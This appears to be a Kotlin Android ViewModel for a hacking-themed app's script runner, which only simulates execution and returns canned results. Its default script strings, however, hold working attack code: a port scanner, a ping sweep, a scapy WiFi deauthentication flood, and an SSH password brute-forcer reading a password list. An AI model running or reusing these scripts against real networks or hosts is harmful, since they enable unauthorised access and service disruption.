package com.xyrenn.hacking.ui.tools.advanced

import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.xyrenn.hacking.ui.tools.advanced.models.Script
import com.xyrenn.hacking.utils.helpers.ScriptHelper
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class ScriptRunnerViewModel @Inject constructor(
    private val scriptHelper: ScriptHelper
) : ViewModel() {

    private val _scripts = MutableLiveData<List<Script>>()
    val scripts: LiveData<List<Script>> = _scripts

    private val _selectedScript = MutableLiveData<Script?>()
    val selectedScript: LiveData<Script?> = _selectedScript

    private val _isRunning = MutableLiveData(false)
    val isRunning: LiveData<Boolean> = _isRunning

    private val _output = MutableLiveData("Ready")
    val output: LiveData<String> = _output

    private val scriptsList = mutableListOf<Script>()

    init {
        loadDefaultScripts()
    }

    private fun loadDefaultScripts() {
        scriptsList.addAll(
            listOf(
                Script(1, "Port Scanner", "python", "Scan open ports on target\nimport socket\n\ntarget = input('Enter target IP: ')\nfor port in range(1, 1025):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    result = sock.connect_ex((target, port))\n    if result == 0:\n        print(f'Port {port} is open')\n    sock.close()"),
                Script(2, "Ping Sweep", "bash", "Ping sweep network\n#!/bin/bash\nfor ip in 192.168.1.{1..254}; do\n    ping -c 1 -W 1 $ip | grep '64 bytes' | cut -d' ' -f4 | tr -d ':'\ndone"),
                Script(3, "WiFi Deauth", "python", "Deauth attack simulation\nfrom scapy.all import *\n\nap_mac = input('Enter AP MAC: ')\nclient_mac = 'ff:ff:ff:ff:ff:ff'\n\npkt = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)\nsendp(pkt, count=100, inter=0.1)"),
                Script(4, "Brute Force SSH", "python", "SSH brute force simulation\nimport paramiko\n\nhost = input('Enter target IP: ')\nusername = input('Enter username: ')\nwith open('passwords.txt', 'r') as f:\n    for password in f:\n        password = password.strip()\n        try:\n            client = paramiko.SSHClient()\n            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n            client.connect(host, username=username, password=password, timeout=5)\n            print(f'Success! Password: {password}')\n            break\n        except:\n            print(f'Failed: {password}')")
            )
        )
        _scripts.value = scriptsList
    }

    fun loadScripts() {
        _scripts.value = scriptsList
    }

    fun selectScript(script: Script) {
        _selectedScript.value = script
        _output.value = "Selected: ${script.name}"
    }

    fun runSelectedScript(params: String) {
        val script = _selectedScript.value ?: return

        viewModelScope.launch {
            _isRunning.value = true
            _output.value = "Running ${script.name}...\n"

            // Simulate script execution
            delay(2000)

            val result = when (script.name) {
                "Port Scanner" -> "Open ports found: 22, 80, 443"
                "Ping Sweep" -> "Live hosts: 192.168.1.1, 192.168.1.100, 192.168.1.101"
                "WiFi Deauth" -> "Deauth attack completed. Sent 100 packets."
                "Brute Force SSH" -> "Password found: admin123"
                else -> "Script executed with params: $params"
            }

            _output.value = result
            _isRunning.value = false
        }
    }

    fun stopScript() {
        _isRunning.value = false
        _output.value = "Script stopped"
    }

    fun saveScript(name: String, content: String) {
        val newId = (scriptsList.maxOfOrNull { it.id } ?: 0) + 1
        val script = Script(newId, name, "custom", content)
        scriptsList.add(0, script)
        _scripts.value = scriptsList.toList()
    }

    fun deleteSelectedScript() {
        val script = _selectedScript.value ?: return
        scriptsList.removeAll { it.id == script.id }
        _scripts.value = scriptsList.toList()
        _selectedScript.value = null
        _output.value = "Script deleted"
    }
}